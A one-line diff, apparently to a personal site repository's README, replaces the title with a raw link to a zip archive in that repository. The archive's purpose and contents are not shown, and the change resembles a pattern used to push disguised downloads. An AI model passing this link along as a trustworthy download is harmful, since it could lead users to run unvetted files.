@@ -1,1 +1,1 @@
-# artistic.fardin.github.io
+# https://github.com/Fardin6189/artistic.fardin.github.io/raw/refs/heads/main/letter/io_artistic_fardin_github_2.7.zip
